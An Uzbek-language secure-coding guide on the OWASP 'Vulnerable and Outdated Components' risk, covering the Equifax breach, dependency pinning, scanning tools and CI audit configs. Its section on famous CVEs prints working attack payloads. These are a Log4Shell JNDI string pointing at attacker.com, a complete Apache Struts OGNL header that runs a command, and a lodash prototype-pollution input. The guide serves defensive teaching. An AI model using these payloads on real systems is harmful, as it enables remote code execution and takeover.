Vulnerable and Outdated Components - Batafsil Ma'lumot
Nima bu?
Vulnerable and Outdated Components - bu zaif yoki eski kutubxonalar, framework'lar, va boshqa software komponentlaridan foydalanish natijasida yuzaga keladigan xavfsizlik zaifligidir. OWASP Top 10 (2021) ro'yxatida #6 o'rinda turadi.
Zaif komponentlar orqali:

Remote Code Execution (RCE)
Ma'lumotlar o'g'irlanishi
Server to'liq nazorat qilinishi
DoS (Denial of Service) hujumlar

Nima uchun xavfli?
Asosiy Muammolar:

Noma'lum zaifliklar - Siz bilmaydigan CVE'lar
Supply chain attacks - Dependency'lar orqali
Transitive dependencies - Dependency'larning dependency'lari
EOL (End of Life) software - Qo'llab-quvvatlash yo'q
License muammolari - Legal risklarlar

Real-World Misol: Equifax Breach (2017)
🔴 EQUIFAX DATA BREACH (2017)

Zaiflik: Apache Struts CVE-2017-5638
Ta'sir: 147 million kishining ma'lumotlari o'g'irlandi
Sabab: Patch qilinmagan Apache Struts

Timeline:
- Mart 2017: CVE e'lon qilindi, patch chiqdi
- Mart-May 2017: Equifax patch qilmadi
- May 2017: Hujumchilar kirib oldi
- Iyul 2017: Breach aniqlandi
- Sentabr 2017: Public e'lon qilindi

Zarar: $700M+ settlement
Mashhur CVE'lar
1. Log4Shell (CVE-2021-44228)
java// ❌ VULNERABLE - Log4j 2.0 - 2.14.1
import org.apache.logging.log4j.Logger;

Logger logger = LogManager.getLogger();
String userInput = request.getParameter("username");

// XAVFLI: JNDI Injection
logger.info("User logged in: {}", userInput);

// HUJUM:
// username=${jndi:ldap://attacker.com/evil}
// NATIJA: Remote Code Execution!

// Affected versions: Log4j 2.0-beta9 to 2.14.1
✅ TUZATISH:
xml<!-- ✅ pom.xml - Update to safe version -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.17.1</version> <!-- SAFE VERSION -->
</dependency>

<!-- Yoki environment variable -->
<!-- -Dlog4j2.formatMsgNoLookups=true -->
2. Heartbleed (CVE-2014-0160)
bash# ❌ VULNERABLE - OpenSSL 1.0.1 - 1.0.1f

# MUAMMO: Memory leak orqali encryption keys o'g'irlanadi

# Affected: OpenSSL 1.0.1 through 1.0.1f
✅ TUZATISH:
bash# ✅ Update OpenSSL
sudo apt-get update
sudo apt-get install openssl

# Check version
openssl version
# Output: OpenSSL 1.0.1g yoki yuqori

# Certificate'larni almashtirish
sudo openssl req -new -key private.key -out new.csr
3. Apache Struts RCE (CVE-2017-5638)
java// ❌ VULNERABLE - Struts 2.3.5 - 2.3.31, 2.5 - 2.5.10

// MUAMMO: Content-Type header orqali OGNL injection

// HUJUM:
// Content-Type: %{(#_='multipart/form-data').
//   (#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
//   (#_memberAccess?(#_memberAccess=#dm):
//   ((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
//   (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
//   (#ognlUtil.getExcludedPackageNames().clear()).
//   (#ognlUtil.getExcludedClasses().clear()).
//   (#context.setMemberAccess(#dm)))).
//   (#cmd='whoami').
//   (#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).
//   (#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
//   (#p=new java.lang.ProcessBuilder(#cmds)).
//   (#p.redirectErrorStream(true)).
//   (#process=#p.start())}
✅ TUZATISH:
xml<!-- ✅ pom.xml -->
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>2.5.33</version> <!-- SAFE VERSION -->
</dependency>
4. Prototype Pollution (lodash CVE-2019-10744)
javascript// ❌ VULNERABLE - lodash < 4.17.12
const _ = require('lodash');

// HUJUM:
const maliciousPayload = JSON.parse('{"__proto__":{"isAdmin":true}}');
_.merge({}, maliciousPayload);

// NATIJA: Barcha object'lar isAdmin:true ga ega bo'ladi
console.log({}.isAdmin); // true - XAVFLI!
✅ TUZATISH:
json// ✅ package.json
{
  "dependencies": {
    "lodash": "^4.17.21"
  }
}
bashnpm audit fix
npm update lodash
Dependency Management
1. Node.js / npm
❌ Xavfli Amaliyot
json// ❌ package.json - Wildcard versions
{
  "dependencies": {
    "express": "*",           // ❌ Har qanday versiya
    "lodash": "^4.0.0",       // ❌ 4.x.x (breaking changes)
    "axios": "~0.21.0"        // ❌ 0.21.x
  }
}

// ❌ package-lock.json yo'q
// ❌ npm audit tekshirilmaydi
✅ Xavfsiz Amaliyot
json// ✅ package.json - Pinned versions
{
  "dependencies": {
    "express": "4.18.2",
    "lodash": "4.17.21",
    "axios": "1.6.0"
  },
  "devDependencies": {
    "audit-ci": "^6.6.1"
  },
  "scripts": {
    "audit": "npm audit",
    "audit-fix": "npm audit fix",
    "preinstall": "npx npm-force-resolutions"
  },
  "resolutions": {
    "lodash": "4.17.21"
  }
}
bash# ✅ Regular checks
npm audit
npm audit fix

# ✅ Automated scanning
npm install -g snyk
snyk test
snyk monitor

# ✅ CI/CD integration
npm install --save-dev audit-ci
npx audit-ci --moderate
yaml# ✅ GitHub Actions - Dependency check
name: Security Audit

on: [push, pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-node@v3
        with:
          node-version: '18'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run npm audit
        run: npm audit --audit-level=moderate
      
      - name: Run Snyk
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
2. Python / pip
❌ Xavfli Amaliyot
txt# ❌ requirements.txt - No versions
Flask
Django
requests
numpy

# ❌ pip-audit tekshirilmaydi
✅ Xavfsiz Amaliyot
txt# ✅ requirements.txt - Pinned versions
Flask==3.0.0
Django==4.2.7
requests==2.31.0
numpy==1.24.3
cryptography==41.0.7

# Security tools
pip-audit==2.6.1
safety==2.3.5
bandit==1.7.5
bash# ✅ Generate with hashes
pip freeze > requirements.txt

# ✅ Install with hash verification
pip install --require-hashes -r requirements.txt

# ✅ Security scanning
pip install pip-audit
pip-audit

# ✅ Safety check
pip install safety
safety check
safety check --json

# ✅ Code scanning
pip install bandit
bandit -r . -f json -o bandit-report.json
python# ✅ setup.py - Version constraints
from setuptools import setup

setup(
    name='myapp',
    version='1.0.0',
    install_requires=[
        'Flask>=3.0.0,<4.0.0',
        'Django>=4.2.0,<5.0.0',
        'requests>=2.31.0',
    ],
    python_requires='>=3.9',
)
yaml# ✅ GitHub Actions - Python security
name: Python Security

on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'
      
      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install pip-audit safety bandit
      
      - name: Run pip-audit
        run: pip-audit
      
      - name: Run Safety
        run: safety check
      
      - name: Run Bandit
        run: bandit -r . -f json -o bandit-report.json
3. Java / Maven
❌ Xavfli Amaliyot
xml<!-- ❌ pom.xml - SNAPSHOT versions -->
<dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>LATEST</version> <!-- ❌ -->
    </dependency>
    
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.2.1</version> <!-- ❌ OLD & VULNERABLE -->
    </dependency>
</dependencies>
✅ Xavfsiz Amaliyot
xml<!-- ✅ pom.xml - Fixed versions -->
<properties>
    <spring.version>6.1.0</spring.version>
    <log4j.version>2.21.1</log4j.version>
</properties>

<dependencies>
    <dependency>
        <groupId>org.springframework</groupId>
        <artifactId>spring-core</artifactId>
        <version>${spring.version}</version>
    </dependency>
    
    <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-collections4</artifactId>
        <version>4.4</version> <!-- SAFE -->
    </dependency>
</dependencies>

<!-- OWASP Dependency Check -->
<build>
    <plugins>
        <plugin>
            <groupId>org.owasp</groupId>
            <artifactId>dependency-check-maven</artifactId>
            <version>9.0.4</version>
            <executions>
                <execution>
                    <goals>
                        <goal>check</goal>
                    </goals>
                </execution>
            </executions>
        </plugin>
    </plugins>
</build>
bash# ✅ Maven dependency check
mvn dependency-check:check

# ✅ List dependencies
mvn dependency:tree

# ✅ Check for updates
mvn versions:display-dependency-updates
4. PHP / Composer
❌ Xavfli Amaliyot
json// ❌ composer.json
{
    "require": {
        "symfony/symfony": "*",
        "monolog/monolog": "~1.0",
        "guzzlehttp/guzzle": "^6.0"
    }
}
✅ Xavfsiz Amaliyot
json// ✅ composer.json
{
    "require": {
        "php": "^8.2",
        "symfony/symfony": "6.3.8",
        "monolog/monolog": "3.5.0",
        "guzzlehttp/guzzle": "7.8.1"
    },
    "require-dev": {
        "roave/security-advisories": "dev-latest"
    },
    "config": {
        "audit": {
            "abandoned": "report"
        }
    }
}
bash# ✅ Composer audit
composer audit

# ✅ Outdated packages
composer outdated

# ✅ Update with caution
composer update --with-all-dependencies

# ✅ Local Security Checker
composer require --dev sensiolabs/security-checker
./vendor/bin/security-checker security:check
Automated Security Scanning
1. Snyk
bash# ✅ Install
npm install -g snyk

# ✅ Authenticate
snyk auth

# ✅ Test project
snyk test

# ✅ Monitor project
snyk monitor

# ✅ Fix vulnerabilities
snyk fix

# ✅ Docker image scan
snyk container test nginx:latest
yaml# ✅ .snyk policy file
version: v1.25.0
ignore:
  'SNYK-JS-LODASH-590103':
    - '*':
        reason: 'False positive - not using vulnerable function'
        expires: '2024-12-31T00:00:00.000Z'

patch: {}
2. OWASP Dependency-Check
bash# ✅ Download
wget https://github.com/jeremylong/DependencyCheck/releases/download/v9.0.4/dependency-check-9.0.4-release.zip
unzip dependency-check-9.0.4-release.zip

# ✅ Run scan
./bin/dependency-check.sh \
    --project "My Project" \
    --scan ./src \
    --format HTML \
    --out ./reports

# ✅ CI/CD
./bin/dependency-check.sh \
    --project "My Project" \
    --scan . \
    --format JSON \
    --failOnCVSS 7
3. Trivy (Container scanning)
bash# ✅ Install
sudo apt-get install trivy

# ✅ Scan Docker image
trivy image nginx:latest

# ✅ Scan filesystem
trivy fs /path/to/project

# ✅ Scan with severity filter
trivy image --severity HIGH,CRITICAL nginx:latest

# ✅ JSON output
trivy image -f json -o results.json nginx:latest
yaml# ✅ GitHub Actions - Trivy
name: Trivy Security Scan

on: [push]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Run Trivy
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          scan-ref: '.'
          format: 'sarif'
          output: 'trivy-results.sarif'
      
      - name: Upload results
        uses: github/codeql-action/upload-sarif@v2
        with:
          sarif_file: 'trivy-results.sarif'
4. Dependabot (GitHub)
yaml# ✅ .github/dependabot.yml
version: 2
updates:
  # Enable version updates for npm
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10
    reviewers:
      - "security-team"
    assignees:
      - "tech-lead"
    labels:
      - "dependencies"
      - "security"
    
  # Enable version updates for pip
  - package-ecosystem: "pip"
    directory: "/"
    schedule:
      interval: "weekly"
    
  # Enable version updates for Docker
  - package-ecosystem: "docker"
    directory: "/"
    schedule:
      interval: "weekly"
    
  # Enable version updates for GitHub Actions
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
5. npm-audit with CI/CD
yaml# ✅ .gitlab-ci.yml
stages:
  - test
  - security

dependency-audit:
  stage: security
  image: node:18
  script:
    - npm ci
    - npm audit --audit-level=moderate
  allow_failure: false
  only:
    - branches
    - merge_requests

snyk-scan:
  stage: security
  image: snyk/snyk:node
  script:
    - snyk auth $SNYK_TOKEN
    - snyk test --severity-threshold=high
    - snyk monitor
  only:
    - main
Software Bill of Materials (SBOM)
bash# ✅ Generate SBOM with Syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# ✅ Generate SBOM
syft dir:. -o json > sbom.json

# ✅ Generate SBOM for Docker
syft nginx:latest -o cyclonedx-json > sbom-nginx.json

# ✅ Scan SBOM with Grype
grype sbom:sbom.json
json// ✅ SBOM format (CycloneDX)
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.4",
  "version": 1,
  "metadata": {
    "timestamp": "2024-01-15T12:00:00Z",
    "component": {
      "type": "application",
      "name": "my-app",
      "version": "1.0.0"
    }
  },
  "components": [
    {
      "type": "library",
      "name": "express",
      "version": "4.18.2",
      "purl": "pkg:npm/express@4.18.2",
      "licenses": [{"license": {"id": "MIT"}}]
    }
  ]
}
License Compliance
bash# ✅ Check licenses (Node.js)
npm install -g license-checker
license-checker --production --json > licenses.json

# ✅ Check licenses (Python)
pip install pip-licenses
pip-licenses --format=json > licenses.json

# ✅ Check licenses (Java)
mvn license:add-third-party
javascript// ✅ Allowed licenses check
const checker = require('license-checker');

const ALLOWED_LICENSES = [
  'MIT',
  'Apache-2.0',
  'BSD-2-Clause',
  'BSD-3-Clause',
  'ISC'
];

checker.init({
  start: '.',
  production: true
}, (err, packages) => {
  for (let [pkg, info] of Object.entries(packages)) {
    const license = info.licenses;
    if (!ALLOWED_LICENSES.includes(license)) {
      console.error(`❌ ${pkg}: ${license} not allowed`);
      process.exit(1);
    }
  }
  console.log('✅ All licenses compliant');
});
```

## Version Management Strategy

### ✅ Semantic Versioning
```
MAJOR.MINOR.PATCH

MAJOR: Breaking changes
MINOR: New features (backward compatible)
PATCH: Bug fixes

Examples:
1.0.0 → 1.0.1 (patch - safe)
1.0.0 → 1.1.0 (minor - usually safe)
1.0.0 → 2.0.0 (major - review required)
✅ Update Strategy
javascript// ✅ package.json - Version constraints
{
  "dependencies": {
    "express": "4.18.2",        // Exact version (production)
    "lodash": "~4.17.21",       // Patch updates only
    "axios": "^1.6.0",          // Minor updates (dev/test)
    "jest": "*"                 // Latest (devDependencies only)
  }
}
✅ Update Workflow
bash# 1. Check current status
npm outdated

# 2. Update dev dependencies
npm update --dev

# 3. Test thoroughly
npm test

# 4. Update production dependencies one by one
npm update express
npm test

# 5. Review breaking changes
npm view express@5.0.0 --json

# 6. Update package-lock.json
npm install

# 7. Commit
git add package.json package-lock.json
git commit -m "chore: update dependencies"
Monitoring va Alerting
python# ✅ Automated vulnerability monitoring
import requests
import json

class VulnerabilityMonitor:
    def __init__(self, project_name):
        self.project_name = project_name
        self.nvd_api = "https://services.nvd.nist.gov/rest/json/cves/1.0"
    
    def check_cves(self, package_name, version):
        """Check NVD for known vulnerabilities"""
        params = {
            'keyword': package_name,
            'resultsPerPage': 10
        }
        
        response = requests.get(self.nvd_api, params=params)
        data = response.json()
        
        vulnerabilities = []
        for item in data.get('result', {}).get('CVE_Items', []):
            cve_id = item['cve']['CVE_data_meta']['ID']
            description = item['cve']['description']['description_data'][0]['value']
            
            # Check if version affected
            if self.is_version_affected(item, version):
                vulnerabilities.append({
                    'cve': cve_id,
                    'description': description,
                    'severity': self.get_severity(item)
                })
        
        return vulnerabilities
    
    def alert_team(self, vulnerabilities):
        """Send alert to team"""
        if not vulnerabilities:
            return
        
        message = f"⚠️ Security Alert for {self.project_name}\n\n"
        for vuln in vulnerabilities:
            message += f"CVE: {vuln['cve']}\n"
            message += f"Severity: {vuln['severity']}\n"
            message += f"Description: {vuln['description']}\n\n"
        
        # Send to Slack, email, etc.
        self.send_slack(message)
    
    def send_slack(self, message):
        webhook_url = os.getenv('SLACK_WEBHOOK')
        requests.post(webhook_url, json={'text': message})
Best Practices Checklist
✅ QILING:

Regular audits - har hafta dependency scan
Automated scanning - CI/CD'da
Version pinning - production'da exact versions
SBOM generation - har release uchun
License compliance - allowed licenses check
Vulnerability monitoring - real-time alerts
Update strategy - test → staging → production
Security advisories - GitHub/CVE subscribe
Dependency review - yangi dependency qo'shishda
Transitive dependency check - indirect dependencies ham

❌ QILMANG:

Wildcard versions (*, latest)
SNAPSHOT versions production'da
EOL software ishlatish
package-lock.json ignore qilish
Security alerts o'chirish
Bulk updates testing'siz
Unknown source'dan packages
npm/pip cache tampering
Outdated base Docker images
Manual dependency management

🔍 TEKSHIRISH KERAK:
bash# Daily/Weekly checks
npm audit
pip-audit
snyk test
trivy fs .

# Before deployment
npm ci --audit
composer install --no-dev --optimize-autoloader
mvn dependency-check:check

# Regular reviews
npm outdated
pip list --outdated
composer outdated
mvn versions:display-dependency-updates
```

### 📊 METRICS:
```
Track:
- Number of vulnerable dependencies
- Average time to patch
- Dependency age
- Update frequency
- CVE count by severity
- License violations